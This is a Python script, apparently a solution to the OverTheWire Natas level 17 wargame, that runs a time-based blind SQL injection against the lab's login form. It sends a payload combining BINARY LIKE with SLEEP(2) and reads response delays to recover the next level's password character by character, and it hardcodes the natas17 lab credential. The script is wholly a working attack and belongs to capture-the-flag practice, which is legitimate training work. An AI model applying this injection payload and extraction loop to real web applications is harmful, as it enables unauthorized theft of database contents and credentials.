#Import Library
import requests
import re
from string import *
from time import time

#Setting variables needed
username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = f'http://{username}.natas.labs.overthewire.org/'
pw = []
flag = True
characters = ascii_letters + digits

# Connect to natas
session = requests.Session()
while flag:
    for c in characters:
        flag = False
        start = time()
        print(''.join(pw) + c)
        #Using SLEEP() method, Blind SQL Injection can be implemented
        #When password includes 'c', need to wait for more than 2 seconds
        payloads={"username" : 'natas18" AND BINARY password LIKE "' + ''.join(pw) + c + '%" AND SLEEP(2)#'}
        response = session.request('POST', url, auth=(username,password), data=payloads)
        endtime = time()
        if endtime - start > 2:
            pw.append(c)
            flag = True
            break

print(''.join(pw))
